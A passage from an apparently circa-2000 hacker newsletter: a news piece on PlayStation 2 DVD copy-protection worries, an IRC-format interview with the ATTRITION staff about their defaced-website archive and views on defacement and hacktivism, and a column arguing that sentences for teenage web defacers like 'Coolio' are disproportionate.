                  protected by using Macrovision technology -- instead
                  of an analog RGB output. 

                  Some observers said the fact that different industries got
                  different treatment from Hollywood could wind up
                  backfiring. Sony Computer Entertainment, in theory,
                  could argue that Playstation 2 is not a stand-alone DVD
                  player, but a computer, experts said. The console
                  doesn't have a DVD decoder chip, but decodes DVD
                  in software. Therefore, it could be argued that
                  Playstation 2 should be permitted an analog RGB
                  output, like any PC on the market, according to this
                  camp. 

                  One Hollywood studio executive, commenting
                  anonymously, said he is not overly concerned with
                  Playstation 2. In his opinion, the picture quality of
                  analog-to-analog copying via analog RGB is too weak
                  to pose a real threat to filmmakers. Others in the movie
                  industry, however, said Sony may have to solve the
                  problem before it introduces the new game console in
                  the United States, where DVD-Video penetration is far
                  more advanced than in Japan. 

                  Also, Hollywood is giving PCs another look as they
                  become capable of receiving HDTV broadcasting. An
                  unprotected analog RGB interface between a computer
                  and a monitor can allow copyrighted material --
                  particularly high-definition signals -- to traverse "in the
                  clear," with no copy protection, becoming a conduit for
                  mass copying. 

                  One studio executive, who spoke on the condition of
                  anonymity, said that new ideas on copy protection for
                  the analog interface are under discussion among PC,
                  consumer electronics, and movie makers. Companies
                  such as Hitachi, Intel, Matsushita Sony and Toshiba --
                  all with a big stake in the issue -- have been working to
                  find a solution, the executive said. He indicated that an
                  answer might emerge in the next few weeks. 

                  "Although we have not received any technical
                  information about this [Playstation 2] issue yet, if the
                  content is actually being copied from Playstation 2, we
                  need to discuss [matters] with Sony Computer
                  Entertainment to take effective measures," said a
                  spokesman at Sony Picture Entertainment, Tokyo.

      ATTRITION


          Date Published: March 27, 2000
          Date Conducted: March 25, 2000
          Interview Conducted By: WHiTe VaMPiRe
          Interview Conducted With: ATTRITION

               ATTRITION is a leading computer security Web site with dedicated staff. They are probably best known for their defaced Web site archive, as they were among the first to mirror defaced Web sites and provide
               them to the public. We came in contact with the ATTRITION staff and asked them about their plans for the future, how they first started, and more. 

               This interview will be left largely unedited due to the nature of the interview and the amount of people involved. This is to make sure that the original intent of their answers is left intact, without distortion of their
               message. Questions will be colored, answers will be indented. 

          The ATTRITION staff consists of: 

               cult_hero aka jericho aka Brian Martin 
               cOmega - Cancer Omega 
               modify 
               punkis 
               McIntyre 
               munge 



          <WHiTe_VaMPiRe> What initially brought about the creation of ATTRITION?

               <cult_hero> A need for change primarily...
               <cult_hero> before attrition was sekurity.org
               <cult_hero> sekurity.org had a great concept, but no focus or direction
               <cult_hero> dropping it was a way of dropping the lack of direction and let us move on
               <cult_hero> attrition wanted to be more to the point
               <cult_hero> more honest, more in your face
               <cult_hero> no sugarcoating on our words
               <cOmega> Definitely in-your-face.
               <cult_hero> no pretty eye candy to obscure information
               <cOmega> Mostly a meat and potatoes site with little to no window dressing.
               <modify> although people still have trouble reading it <grin>
               <cult_hero> heh. BLACK AND RED IS HARD TO READ YO
               <cOmega> Those come from ppl who don't grok client-side configuration.


          <WHiTe_VaMPiRe> Who were the initial people involved with the founding of ATTRITION?

               <cult_hero> correct me if i am wrong..
               <cOmega> Jericho, Punkis, Modify and myself.
               <modify> Meinel, JP, Winn Schwartau, and Atkinson
               <cult_hero> but i thought it was punkis/comega/me on irc discussing it.
               <cOmega> modify: die die die die
               <modify> sorry, had to :)
               <cOmega> cult_hero: yeah, there was a flurry of emails between us, to.
               <cult_hero> maybe mod was there and lurking ;)
               <cult_hero> yes, lots o mail
               <cOmega> cult_hero: most likely. ;-)
               <cult_hero> in the end, it came down to a list of 10 names
               <cult_hero> attrition made the cut


          <WHiTe_VaMPiRe> On that note, what made you go with the name ATTRITION (besides the obvious)?

               <cult_hero> let me ask you...
               <cult_hero> what is the obvious?
               <munge> so the CIA -WAS NOT- involved in the founding of Attrition?
               <cult_hero> no, the NSA
               <cult_hero> oh wait
               <munge> ;)
               <cult_hero> FBI i mean. yeah, we're their front or something.
               <WHiTe_VaMPiRe> Well, the definition, I suppose. As one of you said so appropriately before, "in your face."
               <cOmega> IIRC, Jer wanted something serious. I would have been happy with a "go-pound-sand-up-your-ass-with-a-mallet.org" domain.
               <cult_hero> attrition literally means "confessing for your sins, but not for the love of god"
               <cult_hero> to me that kind of meant confessing for your sins (read: mistakes) because you had a sense of ethics, honor, morality, duty, etc.
               <punkis> not that jer has any of that stuff
               * punkis snickers
               <cOmega> When jer brought the name up, it seemed quite appropriate too, given that the state of security these days is largely a war of attrition.
               <WHiTe_VaMPiRe> Thinking about it, my definition of ATTRITION in my own mind was changed as I became more familar with your work.
               <cult_hero> vamp: as well as it should...
               <cult_hero> attrition means a lot of things
               <cult_hero> between a print dictionary, classic literature, dictionary.com etc
               * cOmega nods.
               <modify> each viewer interprets and uses the site in their own way
               <cult_hero> because of that, we were able to kind of form our own hybrid definition i think


          <WHiTe_VaMPiRe> How did each of you become involved with ATTRITION?

               <McIntyre> Back in March 1997, I had made a fool of myself with the hacker community.
               <cOmega> I got involved because I enjoyed working with the system and was willing to pitch in when Jer was quite busy.
               <McIntyre> The NCAA Web site was defaced......to make a long story short it was way too easy to track the kiddie down....
               <McIntyre> I had never done it before and made a big media whore of myself....
               <cult_hero> i got involved because i wanted to carry on what i had been doing for five+ years.. with more focus
               <cOmega> Then I started doing more and more stuff...like crashing jer's place about every other weekend.
               <McIntyre> then was outted for the fool I was :)
               <McIntyre> 2 years later....
               <McIntyre> I stumbled across some CPM stuff...was floored...
               <McIntyre> I went to Deja.com
               <McIntyre> searched for her news postings....and found a doozie.
               <munge> i got involved by pitching in on some of the scripting jericho was working on....
               <cult_hero> while comega went to sheep.com
               <cOmega> Another reason why I got so involved with Attrition was because I work for the US government...and they have NO clue about security.
               <cOmega> cult_hero: sheep.gov, mo-ron.
               <cult_hero> munge: some? hah, you did 300% more
               <McIntyre> CPM admitting she took LSD in the 70's when it was medically legal for "brain damage"...her words :)
               <munge> haha cult
               <McIntyre> I passed it onto Jer and that, as they say, is the beginning of a beautiful friendship :)
               <modify> I've known Jericho since 94
               <cOmega> After a long day at the office, coming home to Attrition was a breath of fresh air...validating in its own perverse way.
               <modify> he kicked my teeth in and we have been friends since
               <punkis> I got involved with attrition because jericho liked my cat


          <WHiTe_VaMPiRe> What does ATTRITION mean to each of you personally?


               <cult_hero> sometimes i think i could write a book on just that.
               <punkis> yup
               <punkis> its a love/hate relationship for sure
               <modify> dunno...
               <cOmega> Attrition to me is not only a clearinghouse of valuable information on security, it also contains a load of information as to the consequences of what happens when people don't take security seriously.
               <McIntyre> biting sarcasm, a sharp wit, and forced attrition of those who think they can get away with it
               <cult_hero> there is just so much involved with it... so much going on public and behind the scenes (nothing too exciting mind you, conspiracy theoriest of the world k39383)
               <cOmega> We're known largely for our mirror, but that's less than 50% of what we're all about.
               <punkis> plus its a lot more cO
               <punkis> music reviews, sushi reviews, wine reviews
               <cOmega> The mirror shows the consequences; the rest of the Attrition site shows how one can be proactive about security.
               <cOmega> punkis: true.
               <cOmega> and calamari
               <munge> it's about the calamari, dammit
               <cOmega> Calamari is next to godliness.
               <punkis> yes
               <punkis> yes it is
               <modify> To be honest I've found good friends at Attrition.. beyond the obvious I have found family there
               <punkis> and there is a roy's right by work
               <cOmega> punkis: oh yes.
               <modify> Sushi King rules... I'd like to plug them
               <modify> errr... not in that way though
               <modify> :)
               <cOmega> modify: there's a picture I didn't need.
               <cOmega> Basically, we're all a bunch of sick little monkeys who happen to think alike and we share our various passions in life through this 24-hour megaphone of technology known as attrition.org


          <WHiTe_VaMPiRe> What do you have planned for ATTRITION's future?

               <punkis> personally I want to see a technical focus on attrition
               <cult_hero> attritions future. mostly continuing what we have done and making it better. more access to the information, better stats, better cross ref
               <cult_hero> we have been planning a lot more tech areas
               <munge> *nod*
               <cult_hero> which punkis will be heading up soon i think
               <cOmega> punkis: agreed; more of a focus on technical papers and all that good stuff.
               <cult_hero> you can expect to see the return of errata
               <punkis> yes
               <modify> Im thinkin of giving up my Attrition account to join the ranks of the Happy Hacker Grey hat slappy foundation...
               <cOmega> cult_hero: rad.
               <modify> yes, would like to focus more on technical projects

                    <WHiTe_VaMPiRe> Errata, in what sense?

                         <cult_hero> the errata section that deals with shoddy journalism on the net and in print
                         <cult_hero> www.attrition.org/errata/
                         <cOmega> modify: w00t
                         <cult_hero> it actually was one of our earlier widely recognized pages
                         <WHiTe_VaMPiRe> Ah, right. Negation came to mind as part of that.
                         <cult_hero> lead to a lot of attention and validation of who we were.
                         <cOmega> God knows there's enough errata out there.
                         <cult_hero> errata linked to negation
                         <cult_hero> yes

                    <WHiTe_VaMPiRe> The technical projects, what do you have planned in that regard?

                         <modify> I would like to see more technical documents and programs released by Attrition and its Staff
                         <punkis> I have some ideas for some security related tools I want to put together
                         <punkis> and a couple of real interesting research ideas
                         <cOmega> I'm working on a full PGP guide that will walk users through the command line and gui versions; installation and usage, as well as caveats.
                         <cOmega> I also have a big-ass proposal I'm working on and will be hopefully releasing under the attrition banner.
                         <cOmega> I'm leaving my government job.


          <WHiTe_VaMPiRe> Are there any common misconceptions behind ATTRITION that you would like to clear up?

               <cult_hero> YES
               <cOmega> YES
               <cult_hero> 1. we are not a company
               <punkis> HELL YES
               <cult_hero> 2. we do not profit from attrition
               <cult_hero> 3. we are not an FBI front
               <cOmega> 1. We are not a Hacker Gang.
               <cOmega> 2. We are not LE.
               <punkis> 4. mcintyr5e is really a woman
               <cult_hero> 4. we are not affiliated with the FBI, CIA, ISA, NSA, DOD, etc
               <modify> 6. We never worked for FEMA
               <cOmega> 3. We are NOT "out to get anyone" - we just tell the truth, unpretty as it is.
               <cult_hero> 5. we are not HFG, ULG, GH, or any other kiddy defacer group
               <munge> but, cult, we do meet in giant bunker shaped like a pentagram
               <cOmega> 4. Punkis is really a man.
               <punkis> 6. Yes, we really do have a helicoptor
               <McIntyre> 7. Modify is really a cat.
               <modify> 7. Meinel and JP lie 100% of the time
               <cOmega> 5. We have guns, but we don't have any machine guns.
               <modify> 10. Loop 1
               <cult_hero> 10 goto 1
               <cOmega> 6. We are NOT into vampirism or bloodletting (unless there is sex involved)
               <cult_hero> i do not work for KPMG
               <cult_hero> i was not fired from any security job
               <cult_hero> i am not an fbi informant
               <cOmega> I do work for NASA
               <modify> 11. I need a woman so if any single, attractive women are out there then....
               <cOmega> I am leaving NASA for a better job.
               <cult_hero> attrition has fufilled 2 federal subpoenas in accordance with US Law
               <cOmega> (I know those fuckwits will lie and say I was 'fired' or some shit.)


          <WHiTe_VaMPiRe> When did ATTRITION initially start the defaced Web site archive?

               <cOmega> Actually, defacement mirroring started before attrition.
               <cOmega> It became "institutionalized" under attrition.
               <cult_hero> comega started it long ago
               <cult_hero> back when it was an uncommon occurance
               <cOmega> I was doing it way back in the sek.org days.
               <cOmega> I mirrored only sites that I thought were entertaining or elegant in some way.
               <modify> Craig Whitmore started it
               <cOmega> My favorite of all time is "That 0wned Girl".

                    <WHiTe_VaMPiRe> So ATTRITION's mirror was actually a continuation of a project initially started by cOmega?

                         <punkis> yes
                         <cOmega> In a manner of speaking. Jer took the idea and pumped it full of steroids.
                         <cult_hero> yes

               <McIntyre> When I joined up in Fed 1999......I went around to other dead mirrors and asked if we could archive their material
               <cult_hero> 001. comega's mirror of elegant hacks
               <cult_hero> 002. collection of other mirrors
               <cult_hero> 003. start to mirror new sites
               <cult_hero> 004. begin to refine process
               <cult_hero> 005. begin to automate the mirror process
               <cult_hero> 006. revamp the mirror
               <cult_hero> 007. further refine mirror, automatino, etc.
               <cOmega> cult_hero: we got to port the mirror into a db.
               <cOmega> mSQL or similar
               <cult_hero> 008. begin to take a more active stance in awareness and statistics
               <cult_hero> that is kind of the progression
               <cult_hero> that is a future goal of the mirror
               <cult_hero> DB it, and make it more searchable
               * cOmega nods.
               <cult_hero> more stats
               <cult_hero> Munge is working on some killer graphical stats pages regarding defacements
               <cult_hero> these will be the kind that make CERT look bad
               <cult_hero> it will put CSI/FBI to shame
               <cult_hero> let me rant a sec
               <cult_hero> one thing we have going for us about the mirror..
               <cult_hero> is that people report the incidents to us
               <cult_hero> not just the hackers
               <cult_hero> but admins sometimes
               <cult_hero> because of this, we can generate a lot more comprehensive stats than the FBI/CERT does
               <cult_hero> because people see reporting to them as a waste of time
               <cult_hero> their lack of response and action discourages further reporting
               <cOmega> The FBI only investigates cases involving mondo $$$ or mondo politics.
               <cult_hero> because of this, we hope to take their place in providing realistic statistics regarding computer intrusion
               <modify> One clarification here though everybody
               <modify> and everybody reading this
               <cult_hero> fbi unofficial amount is 5k
               <modify> WE DO NOT HACK THE SITES THAT APPEAR ON THE MIRROR
               <cult_hero> heh
               <punkis> thank you mod
               <cOmega> And our work has one great benefit: we don't do this to pump up our budget or increase revenue (unlike the .com's and .govs)
               <cult_hero> amen
               <cOmega> we do it because we are passionate about it.
               <modify> so stop accusing us ya lackwits
               <cult_hero> and as we have said, we have all turned down consulting work from the mirror
               <cOmega> modify: werd to that.
               <McIntyre> and we continue to do so
               <cult_hero> as much as we hate to do it (and admit it), we've lost some great consulting gigs
               <cult_hero> if we did this for indirect money, i think it would somewhat invalidate our purpose and reason
               <cOmega> Agreed.
               <cOmega> Oh yes, one more thing.
               <modify> yah, but maybe I should get the arts and crafts store to provide financial backing?
               <cOmega> Please ask the kiddies to stop asking us 1. how to hack, or 2. how they can break the law in fucking with their ex or stupid shit like that.


          <WHiTe_VaMPiRe> The next question was, "What is your reasoning behind the defaced Web site archive?" .. but I believe you already answered that.

               <cult_hero> lemme clarify something
               <cult_hero> people like to say that we encourage kids by providing the mirror
               <cult_hero> as punkis always mentions, does this means the news agencies are guilty of encouraging murder?
               <cult_hero> they write about it, live around it, film it, feed it to the masses
               <cOmega> Like I said earlier, the mirror shows what the consequences are if someone doesn't take security seriously...and website defacements are the LEAST menacing consequence. Consider the intruder who
               alters your data or silently swipes a credit card databse (unlike Curador). Now *that* is scary.
               <cult_hero> 1. if we don't do it, someone else will.
               <cult_hero> 2. with us doing it, we think we can do it with a lot of integrity and milk it for valuable info in the form of stats and comparisons
               <McIntyre> So....we might as well do it fully and completely
               <cult_hero> 3. we berate the shit out of the kids reporting these sometimes. we call them lame script kiddies for their actions.
               <cult_hero> 3.5 we do NOT condone their activity any more than shrinks condone the behaviour of their clients
               <cOmega> no doubt


          <WHiTe_VaMPiRe> What are your personal feelings on Web site defacements?

               <cOmega> Lame.
               <punkis> I think they are fucking lame
               <modify> stupid
               <punkis> such as is tagging
               <cOmega> There is no elegance in it these days.
               <modify> no purpose
               <punkis> same thing
               <cOmega> Just greets and swearing.
               <cult_hero> 99.9% are a waste of time, talent, and purpose
               <punkis> 99.9% require no tallent
               <cult_hero> nod
               <modify> any reason to hack amnesty international?
               <cOmega> At least the "That 0wned Girl" defacement was funny.
               <modify> no
               <McIntyre> At least those done for hacktivism had a reason.....
               <modify> yah, that rooled
               <munge> who reads the mirror archive just to see the defacements anymore? not me. 'nuff said.
               <cOmega> Some other hacks that I mirrored early on were funny as hell.
               <cult_hero> if we don't mirror them, they will continue to happen tho
               <punkis> and when they defaced KKK it was fucking stupid....no message
               <cult_hero> the URLs will be passed around IRC and mail lists
               <McIntyre> I've seen maybe 5-6 good ones since I started last February.....
               <McIntyre> 1999
               <WHiTe_VaMPiRe> 'Hacktivism' these days is a shroud / justification for lacking actions, quite frequently, from what I have seen.
               <cult_hero> so we mirror them despite their lame message
               <munge> *nod*
               <McIntyre> all the rest are just plain wasteful.
               <punkis> hactivism is a myth
               <modify> its a freakin excuse
               <cOmega> WHiTe_VaMPiRe: Given what I've seen, hactivism is a myth.
               <modify> lets face it
               * cOmega hi5's punkis.
               <McIntyre> Don't fucking hack a site because you can.
               <cult_hero> i think i have found a way to identify hacktivism. no signature. if you are hacking for a reason, there is no need to put a name, group name, or greets.
               <cOmega> It's like this: if you have a beef with, say, Big Oil, would you picket a Mom & Pop dime store?
               <cult_hero> those that do so are using it as a justification, not for pure hacktivism
               <cOmega> That's what these kiddies are doing when they hit 'smalltime.com' and bitch about 'big government'.
               <modify> I hacked it for freedom of speech or freedom of information is a crock of shit too... 
               <McIntyre> cOmega...exactally.
               <cult_hero> like the Japanese servers defaced today to rant (in english) about Pakistan/Indian issues
               <McIntyre> If you have a message. Deface a site that has something to do with that message (not that we condone it...)
               <cOmega> It's like when H4G1S hit NASA HQ.
               <cOmega> They bitched about commercialization of the Internet.
               <cOmega> Uhhh...DUH? Then why not hit a .com, ya sutpid fucks?
               <munge> if hackers want to have an impact, then they should donate their time and skills to causes they believe in. 



          <WHiTe_VaMPiRe> From what you have seen, what are the common motives for Web site defacement?

               <McIntyre> 1. Because they can
               <cOmega> WHiTe_VaMPiRe: juvenile angst.
               <cult_hero> motive is because they can
               <punkis> yes I agree with mcintyre
               <McIntyre> 2. To make fun of another group/rile them up
               <cult_hero> and because they think 'hacking' is sexy
               <McIntyre> 3. to test their skills
               <cult_hero> "everyone else does, it must be what hacking is about, so i will do it so i can be a hacker"
               <McIntyre> 4. to show off
               <cult_hero> circular logic
               <cOmega> WHiTe_VaMPiRe: why do young kids go hot rodding? It's a rush and it makes them feel big.
               <punkis> defacing a web site != hacking
               <munge> donate time to green peace, something like that. don't deface a corporate website
               <cOmega> punkis: word.
               <modify> stop at #1 and loop
               <munge> *nod* punkis
               <McIntyre> 5. to get their message out regardless of what site they deface
               <cOmega> Doing a ./latest-sploit.sh != hacking
               <cOmega> And the only thing lamer than defacements is DoS'ing.
               <McIntyre> 6. being the first to deface a new country....
               <McIntyre> 7. being the first to deface an new OS
               <McIntyre> (ie Win2k)
               <modify> yah, and running UNIX exploits against an NT server isn't gonna work... thats TIP #1
               <cult_hero> defacing a "secure" company
               <cOmega> hahahha
               <punkis> and iishack is not effective against apache
               <munge> haha
               <modify> lol
               <cult_hero> or the morons who tried to hit us with IIS exploits the other night
               <WHiTe_VaMPiRe> hahah
               <WHiTe_VaMPiRe> Nice.
               <McIntyre> I bet it won't be long before someone tries to deface a Palistine site (.ps) when they go live.
               <cOmega> Remind me to show you my logs at work sometime. Not a lot of brain thrust out there.


          <WHiTe_VaMPiRe> Do you feel that there is any valid motive for defacing a Web site?

               <cult_hero> good question
               <cult_hero> valid MOTIVE? sure
               <cult_hero> strictly speaking of motives, i think so
               <WHiTe_VaMPiRe> valid reasoning, I should say..
               <modify> women only.. just od it for women
               <cult_hero> true hacktivism. david vs goliath (angry consumer vs large corp)
               <punkis> its just a shame no valid motives are never demonstrated
               <modify> like Zyklon
               <cult_hero> exactly
               <cult_hero> mod: that is called obsessive stalking i think
               <punkis> like I said, KKK was defaced, which I have no problem with, but there was no message
               <modify> whats wrong with that
               <modify> ?
               <cOmega> I can see doing it as a prank between friends, but as an actual intrusion with intent to damage someone else's property, I couldn't go with that. Minor exceptions would be made for hate groups and/or
               pedophiles.
               <cOmega> But that's on principle alone.
               <cOmega> I think defacements generally denigrate the intent of doing good.
               <punkis> especially when these fuckwits are defacing schools that really have no admin/security personel to speak of
               <punkis> they are helpless

               <modify> message #2
               <cult_hero> </disclaimer>
               <modify> sorry just clearing up FAQ's


          <WHiTe_VaMPiRe> Do you have any comments on the legal implications of computer crime?

               <cOmega> WHiTe_VaMPiRe: legal implications?
               <cult_hero> can you be more detailed?
               <cOmega> explain.

               <WHiTe_VaMPiRe> The current law enforcement response to say, Web site defacement, and other forms of computer crime that are starting to become more prominant.

               <cOmega> I personally believe the idea of increasing penalties for hacking is utterly wrong-headed.
               <cult_hero> another book in the making
               <punkis> yes
               <munge> cOmega: *agreed*
               <cOmega> Security is not rocket science.
               <modify> Poor admins are too easy to point fingers..
               <cOmega> If the government would focus more on the ounce of prevention rather than the pound of cure, we would have have 1/10th of 1% of the number of intrusions we have today.
               <modify> ITS YOUR JOB@!!!!
               <modify> stop surfing porn
               <cOmega> modify: right on.
               <munge> haha maud
               <cult_hero> As my mother said, it is a knee-jerk reaction you find made by law enforcement to ANY 'new' type of crime
               <punkis> well put
               <cOmega> the media doesn't help matters, either.
               <cOmega> it puts for the proposition that these scriptkiddies are 'geniuses' because it's a sexy story.
               <punkis> the media is the driving force behind the governments reaction
               <cOmega> it's not sexy enough to say that the admins are lazy bums and that everyone and theire brother who had a clue knew about the vulnerability 2 years ago.

                    <WHiTe_VaMPiRe> What response do you feel would be most appropriate from law enforcement?

                         <cOmega> I expect nothing appropriate from law enforcement.
                         <cult_hero> "you were broken into because you are stupid. secure your machines"
                         <cOmega> The legislature is the only branch that can change it.
                         <McIntyre> Taking the time to learn the technology they're dealing with
                         <modify> Kick every door in until you find the culprit :)
                         <McIntyre> rather than working against it
                         <cOmega> LE is just a group of droids who follow orders.
                         <cult_hero> i think most web site investigations are a waste of tax payer money
                         <punkis> like mod said, so your fucking job
                         <cOmega> cult_hero: agreed++
                         <punkis> s/so/do
                         <modify> Admins need to take more time to look at the security of their network
                         <modify> its not freakin hard
                         <punkis> some of the mail we get from cluless admins really floors me

                    <WHiTe_VaMPiRe> As more laws are being passed as of late, and others trying to be passed, what do you think is the best response? More laws, less laws? What type of laws? What do you feel the
                    overall best response to computer crime and punishment would be?

                         <cult_hero> The same laws. The laws are NOT the problem.
                         <cOmega> WHiTe_VaMPiRe: I'll tell you this: out of 2,000 admins at one NASA center, I can count on one hand the number who actually understand how to lock down a server. And
                         people wonder why NASA gets breached so often!
                         <modify> Security awareness... 
                         <cult_hero> I think the FBI need to stand back and qualify what is worth investigating.
                         <cOmega> WHiTe_VaMPiRe: I think the next law that gets passed should be one that set a mandatory limit on what qualifies someone to be an admin.
                         <punkis> a large media response is not a good justification for an investigation
                         <cult_hero> They are being jerked in every direction by bureacracy, charlatan consultants claiming to have miracle solutions, media pressure, and more
                         <cult_hero> how can they be expected to do a good job when they have no understanding of the security arena?
                         <cOmega> The proposal I'm working on should eradicate a lot of charlatans and snakeoil in the industry.
                         <modify> I love the admins that throw up a NT server and leave it... kinda like leaving your car running while going to the store
                         <McIntyre> Why concentrate on a Web defacement where nothing was deleted, yet ignore the constant intrustions into gov servers by machines in foreign countries
                         <cult_hero> Think the FBi would have busted Curador had there been no media attention?
                         <cult_hero> hell no.
                         <cOmega> cult_hero: curador also wiggled his ass at them, which was not a bright thing to do.
                         <cOmega> curador bragged too much.
                         <cult_hero> without the media attention, they never would have seen such ass wiggling
                         <punkis> heh
                         <cOmega> true
                         <McIntyre> Although, I have to admit....there was less attention on Curador than there was with Max Stone and the DDoSers
                         <cOmega> What got Curador was that he used the stuff he stole.
                         <cOmega> Which was not too terribly bright.
                         <modify> oh.. new buzzword bingo will be "Zombie Attacks" look for it at a theatre near you!
                         <cult_hero> fraud bumped it into a new level of crime
                         <McIntyre> that and he kept moving from place to place leaving a new trail to add to the investigation each time.
                         <cOmega> I think the other half of that criminal investigation should be the sites that left CC data on the server unencrypted.
                         <cult_hero> all free servers, which log heavily
                         <cOmega> I'd like to stay with that for a moment.
                         <cOmega> You see, a lot of our rights are under attack by our own government.
                         <cOmega> Our right to explore (ala restrictions on reverse engineering)
                         <cOmega> Our right to possess firearms
                         <cOmega> Our right against unreasonable search and seizure (see the drug laws)
                         <cOmega> Did you know that if you carry around more than 500 dollars on your person and a cop sees it, that money can be legally taken from you WIHTOUT your being arrested or
                         charged??
                         <cOmega> And you have to PROVE you have it legally.
                         <cOmega> I kid you not.
                         <cOmega> It's part of the zero tolerance anti-drug laws.
                         <cOmega> look it up.
                         <cOmega> I -- right now -- am a Fourth Amendment nightmare waiting to happen.
                         <cOmega> I plan to rant on it via attrition in the future.
                         <cOmega> Guns are my primary passion. To me, the 2nd Amendment is as crucial as the First Amendment (which is what Attrition is all about).


          <WHiTe_VaMPiRe> As the defaced Web site archive seems to be the area most focused on within ATTRITION these days, what section do you feel is most overlooked, or does not get as much attention as it deserves?

               <McIntyre> Always room for Ramen
               <cult_hero> i dig ramen.
               <modify> with butter
               <cult_hero> not as much as calamari, sushi or mississippi mud tho
               <munge> Ramen: Yes.

               <munge> i like the chili ramen :)
               <cOmega> I eat Habanero chilis and popcorn. I was born before Ramen came into existence.


          <WHiTe_VaMPiRe> Anything you would like to discuss or any closing comments before we end this interview?

               <cOmega> One thing I'd like to add.
               <cult_hero> if something isn't covered here...

               <cult_hero> not just you vamp, all the interview readers too.
               <cOmega> This does not mean we are against anyone.
               <cOmega> We are only against those people who do not practice accuracy, truth or fairness.
               <cOmega> It's a matter of principles, not personalities.
               <cOmega> And don't let anyone tell you different.

141.0 HNN:Mar 29th:The Unfairness of Computer Crime Sentences

      Are the punishments given to those who commit relatively minor
      computer-related crimes, such as web page defacements unfair? Rather
      than being treated like their real-world counterparts (eg: trespass
      and spray-painting graffiti), and earning the fairly minor sentences
      that fit the actual crimes, they are most often instead treated as
      serious felonies deserving of overly harsh punishments, which are
      simply completely out of line with the crimes committed, and are
      seemingly only given just because a computer was involved.

      A matter of degrees: Let the punishment fit the crime.
       
      
          Summary When Attorney General Janet Reno's report, "The Electronic 
          Frontier: The Challenge of Unlawful Conduct on the Internet," was 
          published earlier this month, it drew the conclusion that "existing 
          federal law is generally adequate to cover unlawful conduct involving 
          the use of the Internet." J.S. Kelly rather vehemently disagrees with 
          that finding. (2,000 words) 

     By J.S. Kelly 



         US attorney general's report, entitled "The Electronic Frontier: The 
         Challenge of Unlawful Conduct on the Internet," repeatedly emphasized a 
         need to treat unlawful conduct online the same as it is treated 
         offline. 

     At least two glaring examples of how cyber issues are handled differently 
     than their counterpart issues in the non-Internet world were not included 
     in the report. One of those issues is that car manufacturers, unlike 
     software companies, are held liable for selling products they know are 
     defective. I'd like to address that well known shortcoming in a future 
     column, devoting this one to an issue that's even more important. 

     Free Coolio In the first week of March, at about the same time the report 
     was published, news sources reported that a 17-year-old New Hampshire kid, 
     who goes by the online name Coolio, had been detained as a suspect in a 
     hacking case. 

     The teen told reporters that he had defaced three Web sites, of which two 
     were US government sites. But they weren't exactly the equivalent of the 
     Pentagon -- D.A.R.E. is the Los Angeles Police Department's antidrug 
     Website for kids, and the CWC is the relatively unknown and unimportant 
     Chemical Weapons Convention Webpage. The site hosts informational texts 
     relating to the CWC, a global treaty that bans chemical weapons. 

     The third supposed hack (a hijacking, actually) attributed to Coolio is 
     that of RSA, a commercial computer security company. 

     Website defacement is being described by US authorities as felony 
     vandalism, while in Canada the same phenomenon seems to be called malicious 
     mischief to data. 

     Let he who is without youthful indiscretions cast the first stone The 
     media, with visions of Pulitzer prizes dancing in their heads, have pursued 
     this story with due diligence and vigor. 

     News reports described the teen in ominous tones, as "a high school 
     dropout" who "regularly gets high on cough syrup," who is supposedly 
     emotionally unstable because he is liable to fly off the handle when 
     criticized, and whose room is "almost too messy to enter." 

     Give me a break -- the kid is 17 years old. If they'd found a 17-year-old 
     with a really neat room, who was ostensibly not prey to the emotional ups 
     and downs usually associated with adolescence, then I might be a little 
     more worried. I'd prefer that he experimented with cough syrup and 
     mouthwash than with heroin. And he was not a dropout: he left school early 
     and got his GED. 

     Now, you might argue that to break into computers and to deface US 
     government Websites is, well, kind of dumb. I don't disagree. But 
     adolescence is dumb, too. 

     Adolescence is all about testing limits, standing up to authority (and 
     rejecting it) and generally behaving like an idiot. It's also about 
     thinking you'll never die, and that you'll never get caught. 

     According to news reports, Coolio will be charged as an adult with 
     "unlawfully accessing a computer or otherwise disrupting computer 
     operations that results in more than $1,000 in harm." (D.A.R.E., a 
     not-for-profit organization, claims it lost $18,000 -- from the potential 
     donations that might have flooded in to the site had it not been in its 
     altered state.) 

     If convicted (as an adult), the kid could face 5 to 15 years in prison and 
     a maximum fine of $4,000 -- for one Website defacement. He has, however, 
     admitted to three, and that would earn him a potential total of 45 years in 
     jail. But he got D.A.R.E. twice -- so that could bring the number of years 
     to 60. 

     You know, I just don't think adolescent pranks usually carry these kinds of 
     consequences in the real world. 

     Tough on crime Reno's Department of Justice report mentions the need to 
     teach kids in schools about ethical computer use. The department plans to 
     use a cartoon character similar to MacGruff the Crime Dog to ensure the 
     friendliness of the message. Something tells me they're targeting the wrong 
     demographic here. 

     The report also suggests that courts not be required to sentence all 
     computer intruders to what is now a mandatory six-month jail term for 
     unauthorized access to systems. (Note that the use of the word systems is 
     pretty vague here, as, for that matter, is the use of the term unauthorized 
     access.) 

     The motivation for the sentence reduction is not mercy. It is the opposite. 
     The attorney general's report explains: "In some instances, prosecutors 
     have exercised their discretion and elected not to charge some defendants 
     whose actions otherwise would qualify them for prosecution under that 
     section, knowing that the result would be mandatory imprisonment." 

     The Justice Department wants more convictions, and it is willing to waive 
     mandatory sentencing to get them. Imagine how conviction rate statistics 
     for computer crime might jump from 1999 to 2000 if the department's request 
     is granted. 

     Reno's report continues: "Computer hacking 'for fun' is a very serious 
     problem not only for the targets of the attacks but also for law 
     enforcement personnel who often have no way to determine the motivation for 
     and the identity of the person behind the intrusion." 

     That bothers me. Our laws permit us to determine motivation for crimes such 
     as murder in the first degree versus manslaughter -- or the difference 
     between loitering and loitering with intent. I guess it's the purview of 
     the court -- and not law enforcement -- to determine the motivation, just 
     as it's allegedly in the purview of the court -- and not the legislature -- 
     to determine sentencing. But if motivation is considered to be important in 
     murder and in loitering, why isn't it considered to be important in 
     computer intrusions? 

     Too much free speech In Coolio's case at least, the messages that he 
     allegedly left on each of the Webpages might serve as our first clue to his 
     motivation. You can see all of them at the attrition.org mirror site (see 
     Resources for URL). 

     The RSA defacement was a parody of the firm's regular front page -- it was 
     even pretty funny. At D.A.R.E., he twice replaced their regular home page 
     with (pretty lame) "pro-drug" messages. But the last line in the text to 
     his CWC defacement made me laugh out loud. The entire text reads: 

          PEACE THROUGH POWER ONE VISION ONE PURPOSE 

          <starrrr> muhaha I did steal head server of Internet. If push "power" 
          button the hole net will be shutdown. I hate all you Quake Playas!! 
          !!uu!! And if push reset button the whole Internet going to DIE 

          Praise Allah and also Coolio for making this all possible! 

          If prayers do not become mandatory throughout the United States, we 
